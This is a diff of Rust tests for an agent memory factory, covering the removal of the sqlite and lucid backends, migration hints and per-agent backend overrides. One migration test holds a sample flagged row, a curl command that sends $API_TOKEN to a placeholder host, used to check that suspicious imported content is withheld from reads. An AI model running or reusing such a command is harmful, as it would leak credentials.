@@ -1,21 +1,16 @@
 use super::*;
-#[cfg(unix)]
-use std::fs;
-#[cfg(unix)]
-use std::os::unix::fs::PermissionsExt;
 use tempfile::TempDir;
 use zeroclaw_config::schema::Config;
 use zeroclaw_config::schema::EmbeddingRouteConfig;
 
+#[cfg(feature = "tachi")]
 #[test]
-fn factory_sqlite() {
+fn factory_tachi() {
     let tmp = TempDir::new().unwrap();
-    let cfg = MemoryConfig {
-        backend: "sqlite".into(),
-        ..MemoryConfig::default()
-    };
+    let cfg = MemoryConfig::default();
+    assert_eq!(cfg.backend, "tachi");
     let mem = create_memory(&cfg, tmp.path(), None).unwrap();
-    assert_eq!(mem.name(), "sqlite");
+    assert_eq!(mem.name(), "tachi");
 }
 
 #[cfg(not(feature = "tachi"))]
@@ -215,207 +210,11 @@ async fn per_agent_markdown_factory_applies_memory_policy() {
     );
 }
 
-// ── Embedding identity reconciliation policy────
-
-/// Embedder returning fixed vectors so store() persists real embeddings.
-struct StaticEmbedding(usize);
-
-#[async_trait::async_trait]
-impl embeddings::EmbeddingProvider for StaticEmbedding {
-    fn name(&self) -> &str {
-        "static"
-    }
-    fn dimensions(&self) -> usize {
-        self.0
-    }
-    async fn embed(&self, texts: &[&str]) -> anyhow::Result<Vec<Vec<f32>>> {
-        Ok(texts.iter().map(|_| vec![0.25f32; self.0]).collect())
-    }
-}
-
-fn static_sqlite(dir: &Path, dims: usize) -> SqliteMemory {
-    SqliteMemory::with_embedder(
-        "test",
-        dir,
-        Arc::new(StaticEmbedding(dims)),
-        0.7,
-        0.3,
-        1000,
-        None,
-        zeroclaw_config::schema::SearchMode::default(),
-    )
-    .unwrap()
-}
-
-fn ident(provider: &str, model: &str, dimensions: usize) -> embeddings::EmbeddingIdentity {
-    embeddings::EmbeddingIdentity {
-        provider: provider.into(),
-        model: model.into(),
-        dimensions,
-    }
-}
-
-fn embedded_rows(mem: &SqliteMemory) -> i64 {
-    let conn = mem.connection().lock();
-    conn.query_row(
-        "SELECT COUNT(*) FROM memories WHERE embedding IS NOT NULL",
-        [],
-        |row| row.get(0),
-    )
-    .unwrap()
-}
-
-#[test]
-fn identity_adopted_on_fresh_store_then_matches() {
-    let tmp = TempDir::new().unwrap();
-    let mem = static_sqlite(tmp.path(), 4);
-    let id = ident("openai", "text-embedding-3-small", 4);
-
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &id, false),
-        EmbeddingIdentityOutcome::Adopted
-    );
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &id, false),
-        EmbeddingIdentityOutcome::Match
-    );
-    assert_eq!(mem.stored_embedding_identity().unwrap(), Some(id));
-}
-
-#[tokio::test]
-async fn identity_adoption_on_legacy_store_keeps_vectors() {
-    let tmp = TempDir::new().unwrap();
-    let mem = static_sqlite(tmp.path(), 4);
-    // Rows written before identity tracking existed: vectors present,
-    // no recorded identity. Adoption must not invalidate them.
-    mem.store("legacy", "pre-existing row", MemoryCategory::Core, None)
-        .await
-        .unwrap();
-    assert_eq!(embedded_rows(&mem), 1);
-
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &ident("openai", "model-a", 4), false),
-        EmbeddingIdentityOutcome::Adopted
-    );
-    assert_eq!(embedded_rows(&mem), 1);
-}
-
-#[tokio::test]
-async fn identity_mismatch_invalidates_vectors() {
-    let tmp = TempDir::new().unwrap();
-    let mem = static_sqlite(tmp.path(), 4);
-    reconcile_embedding_identity(&mem, &ident("openai", "model-a", 4), false);
-    mem.store("k1", "first row", MemoryCategory::Core, None)
-        .await
-        .unwrap();
-    mem.store("k2", "second row", MemoryCategory::Core, None)
-        .await
-        .unwrap();
-    assert_eq!(embedded_rows(&mem), 2);
-
-    let new_id = ident("openai", "model-b", 4);
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &new_id, false),
-        EmbeddingIdentityOutcome::Invalidated(2)
-    );
-    assert_eq!(embedded_rows(&mem), 0);
-    assert_eq!(mem.stored_embedding_identity().unwrap(), Some(new_id));
-
-    // Content was retained: rows are still recallable by keyword.
-    let hits = mem.recall("second", 10, None, None, None).await.unwrap();
-    assert_eq!(hits.len(), 1);
-}
-
-#[tokio::test]
-async fn identity_dimension_change_alone_triggers_invalidation() {
-    let tmp = TempDir::new().unwrap();
-    let mem = static_sqlite(tmp.path(), 4);
-    reconcile_embedding_identity(&mem, &ident("openai", "model-a", 4), false);
-
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &ident("openai", "model-a", 8), false),
-        EmbeddingIdentityOutcome::Invalidated(0)
-    );
-}
-
-#[tokio::test]
-async fn identity_mismatch_with_auto_reindex_reembeds_in_background() {
-    let tmp = TempDir::new().unwrap();
-    let mem = static_sqlite(tmp.path(), 4);
-    reconcile_embedding_identity(&mem, &ident("openai", "model-a", 4), false);
-    mem.store("k1", "auto reindex row", MemoryCategory::Core, None)
-        .await
-        .unwrap();
-    assert_eq!(embedded_rows(&mem), 1);
-
-    assert_eq!(
-        reconcile_embedding_identity(&mem, &ident("openai", "model-b", 4), true),
-        EmbeddingIdentityOutcome::Invalidated(1)
-    );
-
-    // The re-embed runs on the runtime in the background; poll briefly.
-    let mut restored = false;
-    for _ in 0..100 {
-        if embedded_rows(&mem) == 1 {
-            restored = true;
-            break;
-        }
-        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
-    }
-    assert!(restored, "background auto-reindex did not re-embed the row");
-}
-
-#[test]
-fn keyword_only_factory_records_no_identity() {
-    let tmp = TempDir::new().unwrap();
-    // Default config: embedding_provider = "none" → NoopEmbedding.
-    let cfg = MemoryConfig {
-        backend: "sqlite".into(),
-        ..MemoryConfig::default()
-    };
-    drop(create_memory(&cfg, tmp.path(), None).unwrap());
-
-    let mem = SqliteMemory::new("test", tmp.path()).unwrap();
-    assert_eq!(mem.stored_embedding_identity().unwrap(), None);
-}
-
-#[test]
-fn factory_with_embedder_stamps_and_migrates_identity() {
-    let tmp = TempDir::new().unwrap();
-    let mut cfg = MemoryConfig {
-        backend: "sqlite".into(),
-        embedding_provider: "openai".into(),
-        embedding_model: "model-a".into(),
-        embedding_dimensions: 4,
-        ..MemoryConfig::default()
-    };
-    drop(create_memory(&cfg, tmp.path(), Some("test-key")).unwrap());
-    {
-        let mem = SqliteMemory::new("test", tmp.path()).unwrap();
-        assert_eq!(
-            mem.stored_embedding_identity().unwrap(),
-            Some(ident("openai", "model-a", 4))
-        );
-    }
-
-    // Same config again → identity unchanged (Match path, no churn).
-    drop(create_memory(&cfg, tmp.path(), Some("test-key")).unwrap());
-
-    // Model change → factory reconciles to the new identity.
-    cfg.embedding_model = "model-b".into();
-    drop(create_memory(&cfg, tmp.path(), Some("test-key")).unwrap());
-    let mem = SqliteMemory::new("test", tmp.path()).unwrap();
-    assert_eq!(
-        mem.stored_embedding_identity().unwrap(),
-        Some(ident("openai", "model-b", 4))
-    );
-}
-
 #[tokio::test]
 async fn factory_does_not_create_audit_db_by_default() {
     let tmp = TempDir::new().unwrap();
     let cfg = MemoryConfig {
-        backend: "sqlite".into(),
+        backend: "markdown".into(),
         ..MemoryConfig::default()
     };
     assert!(!cfg.audit_enabled, "audit must stay opt-in by default");
@@ -432,7 +231,7 @@ async fn factory_does_not_create_audit_db_by_default() {
 async fn factory_wraps_backend_with_audit_when_enabled() {
     let tmp = TempDir::new().unwrap();
     let cfg = MemoryConfig {
-        backend: "sqlite".into(),
+        backend: "markdown".into(),
         audit_enabled: true,
         ..MemoryConfig::default()
     };
@@ -467,7 +266,7 @@ async fn factory_wraps_backend_with_audit_when_enabled() {
 async fn audit_wrapper_preserves_content_scan_rejection() {
     let tmp = TempDir::new().unwrap();
     let cfg = MemoryConfig {
-        backend: "sqlite".into(),
+        backend: "markdown".into(),
         audit_enabled: true,
         ..MemoryConfig::default()
     };
@@ -649,12 +448,12 @@ async fn create_memory_for_agent_none_wraps_audit_when_enabled() {
 }
 
 /// Boot is validation-resilient (a hand-edited config that fails
-/// `Config::validate` still starts the daemon), so the SQLite-only
+/// `Config::validate` still starts the daemon), so the Tachi-only
 /// typed-memory boundary must ALSO hold at agent-memory construction:
 /// the last chokepoint before background consolidation could produce
 /// typed writes into a backend that rejects them.
 #[tokio::test]
-async fn create_memory_for_agent_rejects_typed_flags_on_non_sqlite_backend() {
+async fn create_memory_for_agent_rejects_typed_flags_on_non_tachi_backend() {
     use zeroclaw_config::multi_agent::{AgentMemoryConfig, MemoryBackendKind as ConfigBackend};
     use zeroclaw_config::schema::{AliasedAgentConfig, Config};
 
@@ -677,12 +476,12 @@ async fn create_memory_for_agent_rejects_typed_flags_on_non_sqlite_backend() {
     );
 
     let err = match create_memory_for_agent(&cfg, "scribe", None).await {
-        Ok(_) => panic!("typed flags with a non-sqlite agent backend must fail startup"),
+        Ok(_) => panic!("typed flags with a non-tachi agent backend must fail startup"),
         Err(err) => err,
     };
     assert!(
-        err.to_string().contains("SQLite-only"),
-        "expected the SQLite-only boundary in the error, got: {err}"
+        err.to_string().contains("Tachi-only"),
+        "expected the Tachi-only boundary in the error, got: {err}"
     );
 }
 
@@ -696,6 +495,8 @@ async fn create_memory_for_agent_rejects_retired_backends() {
     for (backend, name) in [
         (ConfigBackend::Postgres, "postgres"),
         (ConfigBackend::Qdrant, "qdrant"),
+        (ConfigBackend::Sqlite, "sqlite"),
+        (ConfigBackend::Lucid, "lucid"),
     ] {
         let tmp = TempDir::new().unwrap();
         let install_root = tmp.path();
@@ -719,36 +520,13 @@ async fn create_memory_for_agent_rejects_retired_backends() {
             err.contains("agents.scribe.memory.backend") && err.contains(name),
             "{name}: {err}"
         );
+        if matches!(backend, ConfigBackend::Sqlite | ConfigBackend::Lucid) {
+            assert!(
+                err.contains("migrate-native"),
+                "sqlite/lucid retirement error must steer to migrate-native: {err}"
+            );
+        }
     }
-}
-
-#[tokio::test]
-async fn create_memory_for_agent_allows_typed_flags_on_sqlite() {
-    use zeroclaw_config::multi_agent::{AgentMemoryConfig, MemoryBackendKind as ConfigBackend};
-    use zeroclaw_config::schema::{AliasedAgentConfig, Config};
-
-    let tmp = TempDir::new().unwrap();
-    let install_root = tmp.path();
-    let mut cfg = Config {
-        data_dir: install_root.join("data"),
-        config_path: install_root.join("config.toml"),
-        ..Config::default()
-    };
-    cfg.memory.types.enabled = true;
-    cfg.memory.consolidation_extract_facts = true;
-    cfg.agents.insert(
-        "scribe".to_string(),
-        AliasedAgentConfig {
-            memory: AgentMemoryConfig {
-                backend: ConfigBackend::Sqlite,
-            },
-            ..AliasedAgentConfig::default()
-        },
-    );
-
-    create_memory_for_agent(&cfg, "scribe", None)
-        .await
-        .expect("typed flags on the default sqlite backend must construct");
 }
 
 #[test]
@@ -801,205 +579,6 @@ fn factory_markdown() {
 }
 
 #[test]
-fn factory_lucid() {
-    let tmp = TempDir::new().unwrap();
-    let cfg = MemoryConfig {
-        backend: "lucid".into(),
-        ..MemoryConfig::default()
-    };
-    let mem = create_memory(&cfg, tmp.path(), None).unwrap();
-    assert_eq!(mem.name(), "lucid");
-}
-
-#[cfg(unix)]
-fn write_factory_lucid_scripts(
-    dir: &Path,
-    selected_log: &Path,
-    decoy_log: &Path,
-) -> (String, String) {
-    let selected_path = dir.join("selected-lucid.sh");
-    let selected = format!(
-        r#"#!/bin/sh
-set -eu
-if [ "${{1:-}}" = "store" ]; then
-  printf 'store-start:%s\n' "${{2:-}}" >> "{}"
-  case "${{2:-}}" in
-    fast_store:*)
-      printf 'fast-store-complete\n' >> "{}"
-      ;;
-    slow_store:*)
-      printf 'slow-store-complete\n' >> "{}"
-      ;;
-  esac
-  exit 0
-fi
-if [ "${{1:-}}" = "context" ]; then
-  printf 'context-start\n' >> "{}"
-  printf 'context-complete\n' >> "{}"
-  cat <<'EOF'
-<lucid-context>
-- [decision] Factory-selected remote result
-</lucid-context>
-EOF
-  exit 0
-fi
-exit 1
-"#,
-        selected_log.display(),
-        selected_log.display(),
-        selected_log.display(),
-        selected_log.display(),
-        selected_log.display(),
-    );
-    fs::write(&selected_path, selected).unwrap();
-    let mut selected_perms = fs::metadata(&selected_path).unwrap().permissions();
-    selected_perms.set_mode(0o755);
-    fs::set_permissions(&selected_path, selected_perms).unwrap();
-
-    let decoy_path = dir.join("decoy-lucid.sh");
-    let decoy = format!(
-        "#!/bin/sh\nprintf 'invoked\\n' >> \"{}\"\nexit 1\n",
-        decoy_log.display()
-    );
-    fs::write(&decoy_path, decoy).unwrap();
-    let mut decoy_perms = fs::metadata(&decoy_path).unwrap().permissions();
-    decoy_perms.set_mode(0o755);
-    fs::set_permissions(&decoy_path, decoy_perms).unwrap();
-
-    (
-        selected_path.display().to_string(),
-        decoy_path.display().to_string(),
-    )
-}
-
-#[cfg(unix)]
-#[tokio::test]
-async fn parsed_lucid_alias_drives_factory_binary_and_distinct_timeouts() {
-    let tmp = TempDir::new().unwrap();
-    let selected_log = tmp.path().join("selected.log");
-    let decoy_log = tmp.path().join("decoy.log");
-    let (selected_cmd, decoy_cmd) =
-        write_factory_lucid_scripts(tmp.path(), &selected_log, &decoy_log);
-    let raw = format!(
-        r#"
-default_temperature = 0.7
-
-[memory]
-backend = "lucid.selected"
-
-[storage.lucid.selected]
-binary_path = "{selected_cmd}"
-recall_timeout_ms = 10000
-store_timeout_ms = 20000
-
-[storage.lucid.decoy]
-binary_path = "{decoy_cmd}"
-recall_timeout_ms = 30000
-store_timeout_ms = 40000
-"#
-    );
-    let mut config: Config = toml::from_str(&raw).expect("parse Lucid aliases");
-    config.data_dir = tmp.path().to_path_buf();
-    config.validate().expect("Lucid aliases must validate");
-
-    let local = SqliteMemory::new("sqlite", tmp.path()).unwrap();
-    let configured = build_lucid_memory(tmp.path(), local, config.resolve_active_storage());
-    let (lucid_cmd, recall_timeout, store_timeout) = configured.test_process_config();
-    assert_eq!(lucid_cmd, selected_cmd);
-    assert_eq!(recall_timeout, std::time::Duration::from_secs(10));
-    assert_eq!(store_timeout, std::time::Duration::from_secs(20));
-
-    let memory =
-        create_memory_from_config(&config, None).expect("build Lucid memory from parsed alias");
-
-    memory
-        .store(
-            "fast_store",
-            "Fast factory store",
-            MemoryCategory::Core,
-            None,
-        )
-        .await
-        .unwrap();
-    memory
-        .store(
-            "slow_store",
-            "Slow factory store",
-            MemoryCategory::Core,
-            None,
-        )
-        .await
-        .unwrap();
-    let entries = memory.recall("factory", 5, None, None, None).await.unwrap();
-
-    let selected_calls = fs::read_to_string(&selected_log).unwrap_or_default();
-    assert!(selected_calls.contains("store-start:fast_store:"));
-    assert!(selected_calls.contains("fast-store-complete"));
-    assert!(selected_calls.contains("store-start:slow_store:"));
-    assert!(selected_calls.contains("slow-store-complete"));
-    assert!(selected_calls.contains("context-start"));
-    assert!(selected_calls.contains("context-complete"));
-    assert!(!decoy_log.exists(), "unselected Lucid alias was invoked");
-    assert!(
-        entries
-            .iter()
-            .any(|entry| entry.content.contains("factory store"))
-    );
-    assert!(
-        entries
-            .iter()
-            .any(|entry| entry.content.contains("Factory-selected remote result"))
-    );
-}
-
-#[cfg(unix)]
-#[tokio::test]
-async fn migration_factory_uses_selected_lucid_alias() {
-    let tmp = TempDir::new().unwrap();
-    let selected_log = tmp.path().join("selected-migration.log");
-    let decoy_log = tmp.path().join("decoy-migration.log");
-    let (selected_cmd, decoy_cmd) =
-        write_factory_lucid_scripts(tmp.path(), &selected_log, &decoy_log);
-    let raw = format!(
-        r#"
-default_temperature = 0.7
-
-[memory]
-backend = "lucid.selected"
-
-[storage.lucid.selected]
-binary_path = "{selected_cmd}"
-recall_timeout_ms = 10000
-store_timeout_ms = 20000
-
-[storage.lucid.decoy]
-binary_path = "{decoy_cmd}"
-recall_timeout_ms = 30000
-store_timeout_ms = 40000
-"#
-    );
-    let mut config: Config = toml::from_str(&raw).expect("parse Lucid aliases");
-    config.data_dir = tmp.path().to_path_buf();
-
-    let memory = create_memory_for_migration(&config)
-        .expect("build migration memory from selected Lucid alias");
-    memory
-        .store(
-            "fast_store",
-            "Migration alias store",
-            MemoryCategory::Core,
-            None,
-        )
-        .await
-        .unwrap();
-
-    let selected_calls = fs::read_to_string(&selected_log).unwrap_or_default();
-    assert!(selected_calls.contains("store-start:fast_store:"));
-    assert!(selected_calls.contains("fast-store-complete"));
-    assert!(!decoy_log.exists(), "unselected Lucid alias was invoked");
-}
-
-#[test]
 fn factory_none_uses_noop_memory() {
     let tmp = TempDir::new().unwrap();
     let cfg = MemoryConfig {
@@ -1012,10 +591,19 @@ fn factory_none_uses_noop_memory() {
 
 #[test]
 fn factory_retired_backends_fail_explicitly_never_fall_back() {
-    // postgres and qdrant were removed. Selecting one (bare or aliased)
-    // must fail memory construction with an explicit error, never fall
-    // back to markdown or sqlite.
-    for backend in ["postgres", "qdrant", "postgres.default", "Qdrant.Prod"] {
+    // postgres, qdrant, sqlite, and lucid were removed. Selecting one
+    // (bare or aliased) must fail memory construction with an explicit
+    // error, never fall back to markdown or tachi.
+    for backend in [
+        "postgres",
+        "qdrant",
+        "postgres.default",
+        "Qdrant.Prod",
+        "sqlite",
+        "lucid",
+        "sqlite.default",
+        "Lucid.Selected",
+    ] {
         let tmp = TempDir::new().unwrap();
         let cfg = MemoryConfig {
             backend: backend.into(),
@@ -1036,6 +624,13 @@ fn factory_retired_backends_fail_explicitly_never_fall_back() {
             message.contains("was removed") && message.contains("memory.backend"),
             "{backend}: {message}"
         );
+        let lower = backend.to_ascii_lowercase();
+        if lower.starts_with("sqlite") || lower.starts_with("lucid") {
+            assert!(
+                message.contains("migrate-native"),
+                "{backend}: expected migrate-native hint in {message}"
+            );
+        }
     }
 }
 
@@ -1049,22 +644,6 @@ fn factory_postgres_without_storage_alias_errors() {
     let error = create_memory(&cfg, tmp.path(), None)
         .err()
         .expect("dotted backend references require the full Config");
-    assert!(
-        error.to_string().contains("full Config"),
-        "error should require config-aware construction: {error}"
-    );
-}
-
-#[test]
-fn factory_lucid_alias_without_full_config_errors() {
-    let tmp = TempDir::new().unwrap();
-    let cfg = MemoryConfig {
-        backend: "lucid.selected".into(),
-        ..MemoryConfig::default()
-    };
-    let error = create_memory(&cfg, tmp.path(), None)
-        .err()
-        .expect("dotted Lucid aliases require the full Config");
     assert!(
         error.to_string().contains("full Config"),
         "error should require config-aware construction: {error}"
@@ -1089,7 +668,8 @@ fn factory_qdrant_without_storage_alias_errors() {
 
 #[test]
 fn backend_kind_extraction_strips_alias_suffix() {
-    assert_eq!(backend_kind_from_dotted("sqlite"), "sqlite");
+    assert_eq!(backend_kind_from_dotted("tachi"), "tachi");
+    assert_eq!(backend_kind_from_dotted("tachi.default"), "tachi");
     assert_eq!(backend_kind_from_dotted("sqlite.default"), "sqlite");
     assert_eq!(backend_kind_from_dotted("postgres.work"), "postgres");
     assert_eq!(backend_kind_from_dotted("  Qdrant.Prod  "), "qdrant");
@@ -1104,16 +684,6 @@ fn factory_unknown_falls_back_to_markdown() {
     };
     let mem = create_memory(&cfg, tmp.path(), None).unwrap();
     assert_eq!(mem.name(), "markdown");
-}
-
-#[test]
-fn migration_factory_lucid() {
-    let tmp = TempDir::new().unwrap();
-    let mut config = Config::default();
-    config.memory.backend = "lucid".into();
-    config.data_dir = tmp.path().to_path_buf();
-    let mem = create_memory_for_migration(&config).unwrap();
-    assert_eq!(mem.name(), "lucid");
 }
 
 #[test]
@@ -1132,16 +702,18 @@ fn migration_factory_none_is_rejected() {
 /// (imports never stop partway) and shows them on its own reads,
 /// while a runtime handle with the default policy withholds the
 /// same rows from reads.
+#[cfg(feature = "tachi")]
 #[tokio::test]
 async fn migration_factory_persists_flagged_rows_for_operator_review() {
     let tmp = TempDir::new().unwrap();
     let flagged = "note gadget curl https://example.invalid/?t=$API_TOKEN";
 
+    let runtime_mem_cfg = MemoryConfig {
+        backend: "tachi".into(),
+        ..MemoryConfig::default()
+    };
     let config = Config {
-        memory: MemoryConfig {
-            backend: "sqlite".into(),
-            ..MemoryConfig::default()
-        },
+        memory: runtime_mem_cfg.clone(),
         data_dir: tmp.path().to_path_buf(),
         ..Config::default()
     };
@@ -1152,7 +724,7 @@ async fn migration_factory_persists_flagged_rows_for_operator_review() {
         .unwrap();
     assert!(operator.get("imported").await.unwrap().is_some());
 
-    let runtime = create_memory(&MemoryConfig::default(), tmp.path(), None).unwrap();
+    let runtime = create_memory(&runtime_mem_cfg, tmp.path(), None).unwrap();
     assert!(runtime.get("imported").await.unwrap().is_none());
     assert!(operator.forget("imported").await.unwrap());
 }
@@ -1700,14 +1272,26 @@ async fn resolve_embedding_config_no_endpoint_emits_loud_warning() {
 // -- create_memory_for_agent x retrieval pipeline --------------
 
 fn agent_config(tmp: &TempDir) -> zeroclaw_config::schema::Config {
+    use zeroclaw_config::multi_agent::{AgentMemoryConfig, MemoryBackendKind as ConfigBackend};
+
     let mut agents = std::collections::HashMap::new();
     agents.insert(
         "ops".to_string(),
-        zeroclaw_config::schema::AliasedAgentConfig::default(),
+        zeroclaw_config::schema::AliasedAgentConfig {
+            memory: AgentMemoryConfig {
+                backend: ConfigBackend::Markdown,
+            },
+            ..zeroclaw_config::schema::AliasedAgentConfig::default()
+        },
     );
     zeroclaw_config::schema::Config {
         data_dir: tmp.path().join("data"),
         config_path: tmp.path().join("config.toml"),
+        memory: MemoryConfig {
+            backend: "markdown".into(),
+            hygiene_enabled: false,
+            ..MemoryConfig::default()
+        },
         agents,
         ..zeroclaw_config::schema::Config::default()
     }
@@ -1931,9 +1515,8 @@ async fn create_memory_for_agent_allows_typed_flags_on_tachi() {
     assert_eq!(fetched.agent_alias.as_deref(), Some("scribe"));
 }
 
-#[cfg(feature = "tachi")]
 #[tokio::test]
-async fn create_memory_for_agent_honors_per_agent_tachi_override_over_global_sqlite() {
+async fn create_memory_for_agent_honors_per_agent_markdown_override_over_global_tachi() {
     use zeroclaw_config::multi_agent::{AgentMemoryConfig, MemoryBackendKind as ConfigBackend};
     use zeroclaw_config::schema::{AliasedAgentConfig, Config};
 
@@ -1943,7 +1526,7 @@ async fn create_memory_for_agent_honors_per_agent_tachi_override_over_global_sql
         data_dir: install_root.join("data"),
         config_path: install_root.join("config.toml"),
         memory: MemoryConfig {
-            backend: "sqlite".into(),
+            backend: "tachi".into(),
             embedding_provider: "none".into(),
             hygiene_enabled: false,
             ..MemoryConfig::default()
@@ -1952,7 +1535,7 @@ async fn create_memory_for_agent_honors_per_agent_tachi_override_over_global_sql
             "alpha".to_string(),
             AliasedAgentConfig {
                 memory: AgentMemoryConfig {
-                    backend: ConfigBackend::Tachi,
+                    backend: ConfigBackend::Markdown,
                 },
                 ..AliasedAgentConfig::default()
             },
@@ -1962,29 +1545,29 @@ async fn create_memory_for_agent_honors_per_agent_tachi_override_over_global_sql
 
     let mem = create_memory_for_agent(&cfg, "alpha", None)
         .await
-        .expect("per-agent tachi backend must construct even when global is sqlite");
-    assert_eq!(mem.name(), "tachi");
+        .expect("per-agent markdown backend must construct even when global is tachi");
+    assert_eq!(mem.name(), "markdown");
     mem.store(
         "alpha_override",
-        "per-agent override routed to tachi",
+        "per-agent override routed to markdown",
         MemoryCategory::Core,
         None,
     )
     .await
     .unwrap();
     let recalled = mem
-        .recall("routed to tachi", 5, None, None, None)
+        .recall("routed to markdown", 5, None, None, None)
         .await
         .unwrap();
     assert_eq!(recalled.len(), 1);
-    assert_eq!(recalled[0].key, "alpha_override");
-    assert!(cfg.data_dir.join("memory/tachi.db").exists());
+    assert!(cfg.agent_workspace_dir("alpha").join("MEMORY.md").exists());
+    assert!(!cfg.data_dir.join("memory/tachi.db").exists());
     assert!(!cfg.data_dir.join("memory/brain.db").exists());
 }
 
 #[cfg(not(feature = "tachi"))]
 #[tokio::test]
-async fn create_memory_for_agent_refuses_per_agent_tachi_override_without_feature() {
+async fn create_memory_for_agent_refuses_tachi_without_feature() {
     use zeroclaw_config::multi_agent::{AgentMemoryConfig, MemoryBackendKind as ConfigBackend};
     use zeroclaw_config::schema::{AliasedAgentConfig, Config};
 
@@ -1994,7 +1577,7 @@ async fn create_memory_for_agent_refuses_per_agent_tachi_override_without_featur
         data_dir: install_root.join("data"),
         config_path: install_root.join("config.toml"),
         memory: MemoryConfig {
-            backend: "sqlite".into(),
+            backend: "tachi".into(),
             embedding_provider: "none".into(),
             hygiene_enabled: false,
             ..MemoryConfig::default()
